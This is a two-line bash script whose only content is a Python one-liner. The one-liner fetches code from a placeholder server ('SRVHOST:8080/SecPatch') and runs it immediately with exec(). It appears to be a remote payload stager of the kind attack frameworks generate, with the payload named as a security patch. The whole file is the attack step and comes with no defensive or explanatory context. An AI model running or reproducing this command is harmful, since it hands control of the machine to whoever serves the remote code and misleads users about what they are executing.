#!/bin/bash
python -c "import urllib2; r = urllib2.urlopen('http://SRVHOST:8080/SecPatch'); exec(r.read());"

